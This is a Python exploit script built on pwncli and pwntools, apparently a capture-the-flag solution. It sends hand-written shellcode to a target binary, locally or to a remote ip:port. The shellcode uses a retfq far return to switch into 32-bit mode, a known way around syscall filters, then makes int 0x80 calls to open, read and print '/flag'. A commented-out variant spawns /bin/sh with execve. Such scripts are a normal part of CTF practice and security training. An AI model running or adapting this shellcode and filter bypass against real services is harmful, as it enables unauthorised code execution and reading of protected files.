#!/usr/bin/env python3
# Date: 2025-07-04 21:28:36
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)
rl()


code_addr=0x4040a0
code=asm('''
         mov rsp, 0x404800
         push 0x23
         push 0x404100
         retfq
''')
# code=asm(
#         '''
#         xor rsp, rsp
#         mov esp, 0x404800
#         mov DWORD PTR [esp+4], 0x23
#         mov DWORD PTR [esp], 0x404100
#         retfd
# ''')

code=code.ljust(0x60)
# code+=asm('''
#           /* execve("/bin/sh", 0, 0) */
#           mov eax,11
#           mov ebx,0x404200
#           mov ecx,0
#           mov edx,0
#           int 0x80
#           ''')
code+=asm('''
          /* open("/flag", 0, 0) */
          mov eax,5
          mov ebx,0x404200
          mov ecx,0
          mov edx,0
          int 0x80

          /* read(3, 0x404300, 100) */
          mov eax,3
          mov ebx,3
          mov ecx,0x404300
          mov edx,100
          int 0x80

          /* write(1, 0x404300, 100) */
          mov eax,4
          mov ebx,1
          mov ecx,0x404300
          mov edx,100
          int 0x80

          ''')
code=code.ljust(0x160)
# code+=b'/bin/sh\x00'
code+=b'/flag\x00'

s(code)
ia()
